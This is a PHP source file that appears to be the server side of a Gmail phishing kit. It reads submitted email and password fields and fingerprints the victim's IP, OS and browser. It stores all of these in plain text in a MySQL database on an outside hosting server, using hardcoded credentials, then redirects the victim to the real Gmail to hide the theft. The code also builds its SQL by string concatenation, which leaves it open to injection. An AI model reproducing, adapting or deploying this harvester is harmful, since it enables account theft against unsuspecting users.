<?php


function guest_ip()
{
    if (isset($_SERVER["HTTP_CLIENT_IP"]))
    {
        return ($_SERVER["HTTP_CLIENT_IP"]);
    }
    elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
    {
        return ($_SERVER["HTTP_X_FORWARDED_FOR"]);
    }
    elseif (isset($_SERVER["HTTP_X_FORWARDED"]))
    {
        return ($_SERVER["HTTP_X_FORWARDED"]);
    }
    elseif (isset($_SERVER["HTTP_FORWARDED_FOR"]))
    {
        return ($_SERVER["HTTP_FORWARDED_FOR"]);
    }
    elseif (isset($_SERVER["HTTP_FORWARDED"]))
    {
        return ($_SERVER["HTTP_FORWARDED"]);
    }
    else
    {
        return ($_SERVER["REMOTE_ADDR"]);
    }
}


function guest_os()
{
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu'
                        );
    foreach ($os_array as $regex => $value) {

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }
    $os_platform = ($os_platform);
    return $os_platform;
}

function guest_device() {
    $user_agent     = ($_SERVER['HTTP_USER_AGENT']);
    $guest_device   =   "Unknown";
    $device_array  =   array(
                            '/msie/i'      		=>  'Internet Explorer',
                            '/firefox/i'		=>  'Firefox',
                            '/safari/i'     	=>  'Safari',
                            '/chrome/i'     	=>  'Chrome',
                            '/edge/i'       	=>  'Edge',
                            '/opera/i'      	=>  'Opera',
                            '/netscape/i'   	=>  'Netscape',
                            '/maxthon/i'    	=>  'Maxthon',
                            '/konqueror/i' 		=>  'Konqueror',
                            '/mobile/i'     	=>  'Handheld Browser',
                            '/iphone/i'         =>  'iPhone',
                            '/ipod/i'           =>  'iPod',
                            '/ipad/i'           =>  'iPad',
                            '/android/i'        =>  'Android',
                            '/blackberry/i'     =>  'BlackBerry',
                            '/webos/i'          =>  'Mobile'
                        );
    foreach ($device_array as $regex => $value)
    {
        if (preg_match($regex, $user_agent))
        {
            $guest_device = $value;
        }
    }
    return $guest_device;
}



// GLOBALS

$host = "server227.web-hosting.com";
$user = "snappwfm_gmail";
$pass = "8mtV2tatEf7";
$db   = "snappwfm_gmail";
$ip   = guest_ip();
$os   = guest_os();
$dev  = guest_device();
$uid  = md5($ip . $dev);

// MAIN

$conn = mysqli_connect($host, $user, $pass, $db);

if ($conn === false) {
	echo "Connection failed: ".mysqli_connect_error();
	header("Location: https://mail.google.com/mail/");
}

try {

	$email  = $_POST['Email'];
	$passwd = $_POST['Passwd'];

	try {
		$sql = "INSERT INTO clients (id, email, passwd, ip, platform, device) VALUES ('".$uid."', '".$email."', '".$passwd."', '".$ip."', '".$os."', '".$dev."')";
		mysqli_query($conn,$sql);
	} catch (Exception $e) {
		file_put_contents('errorlog',$e);
	}
} catch (Exception $r) {
	file_put_contents('errorlog', $r);
}

header("Location: https://mail.google.com/mail/");

?>

